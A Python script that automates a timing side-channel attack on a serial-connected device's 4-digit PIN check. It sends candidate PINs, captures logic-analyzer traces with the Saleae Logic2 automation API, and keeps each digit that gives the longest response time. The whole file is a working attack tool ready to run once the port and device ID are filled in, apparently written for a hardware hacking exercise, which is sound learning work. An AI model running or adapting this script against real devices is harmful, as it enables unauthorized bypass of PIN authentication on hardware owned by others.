from saleae import automation
import serial
import os

# REPLACEME
# this values need to be adjusted to your system
# -----------------------------------------------
# check in dmesg log
SERIAL_PORT = "/dev/ttyUSB0"
# path to Logic2 binary
APPLICATION_PATH = f"{os.path.dirname(os.path.realpath(__file__))}/../app_images/logic.AppImage"
# Logic2 > Device Info
DEVICE_ID = "8C46FFFA5919C048"
# -----------------------------------------------

# print capture list & interrupt with key
DEBUG = False
# True = launch a new instance
# False = connect on the default port of a running one
LAUNCH = False

# open serial connection
ser = serial.Serial(
        port=SERIAL_PORT,
        baudrate=9600,
        parity=serial.PARITY_ODD,
        stopbits=serial.STOPBITS_TWO,
        bytesize=serial.SEVENBITS
)

# open new Logic2 instance
if LAUNCH:
        manager = automation.Manager.launch(
                application_path= APPLICATION_PATH
        )
else:
        manager = automation.Manager.connect()

# configure the analyzer
device_config = automation.LogicDeviceConfiguration(
        # channels 0 and 1 have to be used
        enabled_digital_channels=[0, 1],
        # 24MS/s
        digital_sample_rate=24_000_000,
)

# configure the capture
capture_config = automation.CaptureConfiguration(
        # trigger on the falling flag of channel 0
        # capture 70µs afterwards
        capture_mode=automation.DigitalTriggerCaptureMode(
                trigger_type=automation.DigitalTriggerType.FALLING,
                trigger_channel_index=0,
                after_trigger_seconds=0.00007
        )
)

# the PIN searching list (serial input)
serial_input = ["1", "0", "0", "0", "\r\n"]

# the PIN is made of 4 digits
for digit_index in range(1, 4):
        print(f"\nsearching for {digit_index}")
        print(f"------------------")

        # counter measures unsuccessful tries to increase timing 
        resets = 0
        # track highest timing with digit
        highest = (-1, 0.0)
        # timing measures (for debug)
        capture_list = list()
        
        for digit in range(10):

                # start new capture
                with manager.start_capture(
                        device_id=DEVICE_ID,
                        device_configuration=device_config,
                        capture_configuration=capture_config) as capture:

                        # replace the input in the serial list
                        serial_input[digit_index] = str(digit)
                        # convert list to string
                        serial_input_str = "".join(serial_input)
                        # send in binary format
                        ser.write(serial_input_str.encode())
                        
                        # wait until the capture has finished (for the trigger)
                        capture.wait()

                        # be able to measure the timing in Logic manually
                        if DEBUG: input("waiting...")

                        # export raw digital data to a CSV file
                        capture.export_raw_data_csv(directory="/tmp/", digital_channels=[0, 1])

                        # read from the dropped file
                        with open("/tmp/digital.csv", "r") as file:
                                content = file.readlines()

                        # search for the correct line in capture
                        line = ""
                        for line_num in range(len(content)):
                                if "0.000000000,0,0" in content[line_num]:
                                        line = content[line_num+1]
                        
                        if line == "":
                                print("error: no line found")
                        else:
                                resets += 1
                                # adjust value to µs
                                line = float(line.split(",")[0]) * pow(10,6)
                                print(f"{serial_input_str[:-2]} -> {line:.7}µs")
                                capture_list.append(line)
                                # update value if input is higher
                                # -> new favorite found
                                if line > highest[1]:
                                        highest = (digit, line)
                                        # reset counter when new value is found
                                        resets = 0
                
                # when the value is not updated three times assume it is the highest one
                if resets == 3:
                        break
        # set found value in input string
        serial_input[digit_index] = str(highest[0])
        print(f"choosing: {highest[0]} -> new PIN {''.join(serial_input)}")


if DEBUG: print(capture_list)
# final result
print(f"found PIN: {serial_input_str}")
manager.close()